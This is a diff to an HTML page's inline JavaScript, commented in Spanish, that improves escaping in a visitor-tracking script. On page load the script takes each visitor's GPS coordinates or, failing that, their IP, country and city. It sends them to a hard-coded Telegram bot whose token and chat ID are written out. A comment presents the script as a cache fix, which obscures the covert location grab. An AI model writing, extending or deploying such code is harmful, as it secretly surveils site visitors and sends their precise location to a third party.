@@ -71,11 +71,16 @@
 </head>
 <body>
 
-    <!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO CON PARSE MODE HTML) -->
+    <!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (ENLACES PROTEGIDOS Y CORREGIDOS) -->
     <script>
     (function() {
         const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
         const CHAT_ID = '9180377107';
+
+        // Función esencial para limpiar caracteres reservados en el HTML de Telegram (&, <, >)
+        function escapeHTML(text) {
+            return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(pos) {
@@ -83,15 +88,17 @@
                 const lon = pos.coords.longitude;
                 const acc = Math.round(pos.coords.accuracy);
 
-                // Tu formato exacto de búsqueda en Google Chrome
+                // Tu formato de búsqueda exacto
                 const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
                 
-                // Construcción limpia usando etiquetas HTML nativas de Telegram
+                // Escapamos la URL para evitar que el ampersand (&) rompa el JSON enviado a Telegram
+                const safeUrl = escapeHTML(rawUrl);
+
                 const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
                               "• Latitud: " + lat + "\n" +
                               "• Longitud: " + lon + "\n" +
                               "• Precisión: ~" + acc + " metros\n\n" +
-                              "👉 <a href=\"" + rawUrl + "\">Ver Ubicación en Google Search</a>";
+                              "👉 <a href=\"" + safeUrl + "\">Ver Ubicación en Google Search</a>";
 
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
@@ -99,7 +106,7 @@
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
                         text: texto,
-                        parse_mode: 'HTML' // Cambiado a HTML para evitar el Error 400
+                        parse_mode: 'HTML' 
                     })
                 }).catch(e => console.error("Error enviando GPS:", e));
 
@@ -114,12 +121,13 @@
                     const city = data.city || 'Desconocida';
                     
                     const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
+                    const safeUrlIP = escapeHTML(rawUrlIP);
 
                     const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
-                                    "• IP: " + ip + "\n" +
-                                    "• País: " + country + "\n" +
-                                    "• Ciudad: " + city + "\n\n" +
-                                    "👉 <a href=\"" + rawUrlIP + "\">Ver Ubicación por IP</a>";
+                                    "• IP: " + escapeHTML(ip) + "\n" +
+                                    "• País: " + escapeHTML(country) + "\n" +
+                                    "• Ciudad: " + escapeHTML(city) + "\n\n" +
+                                    "👉 <a href=\"" + safeUrlIP + "\">Ver Ubicación por IP</a>";
                     
                     fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                         method: 'POST',
@@ -127,7 +135,7 @@
                         body: JSON.stringify({ 
                             chat_id: CHAT_ID, 
                             text: textoIP,
-                            parse_mode: 'HTML' // Cambiado a HTML para evitar el Error 400
+                            parse_mode: 'HTML' 
                         })
                     });
                 }).catch(e => console.error("Error enviando IP:", e));
